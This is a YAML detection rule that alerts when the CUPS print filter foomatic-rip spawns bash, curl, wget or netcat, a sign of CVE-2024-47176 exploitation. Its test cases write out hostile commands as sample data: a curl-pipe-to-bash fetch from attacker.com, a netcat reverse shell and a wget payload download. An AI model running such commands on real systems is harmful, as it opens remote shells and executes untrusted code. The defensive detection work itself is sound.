name: elastic_cups_foomatic_rip_shell
mode: alert
overlap_allowed_with: [sigma_curl_usage, curl_pipe_bash, sigma_netcat_reverse_shell, sigma_susp_network_utilities_execution, suspicious_process, curl_wget_download]
eval: |
  (
    e.process_pname == "foomatic-rip" &&
    (
      e.process_name == "bash" ||
      e.process_name == "sh" ||
      e.process_name == "dash" ||
      e.process_name == "curl" ||
      e.process_name == "wget" ||
      e.process_name == "nc" ||
      e.process_name == "netcat"
    )
  )
tests:
  - cleartext: "bash spawned by foomatic-rip"
    process_name: bash
    process_pname: foomatic-rip
    process_args: "bash -i"
    should_match: true
  - cleartext: "curl from foomatic-rip (CVE-2024-47176)"
    process_name: curl
    process_pname: foomatic-rip
    process_args: "curl http://attacker.com/shell.sh | bash"
    should_match: true
  - cleartext: "netcat reverse shell from foomatic-rip"
    process_name: nc
    process_pname: foomatic-rip
    process_args: "nc -e /bin/bash attacker.com 4444"
    should_match: true
  - cleartext: "wget payload from foomatic-rip"
    process_name: wget
    process_pname: foomatic-rip
    process_args: "wget http://evil.com/payload"
    should_match: true
  - cleartext: "normal bash execution"
    process_name: bash
    process_pname: systemd
    process_args: "bash"
    should_match: false
  - cleartext: "cupsd normal operation"
    process_name: foomatic-rip
    process_pname: cupsd
    process_args: "foomatic-rip -v"
    should_match: false
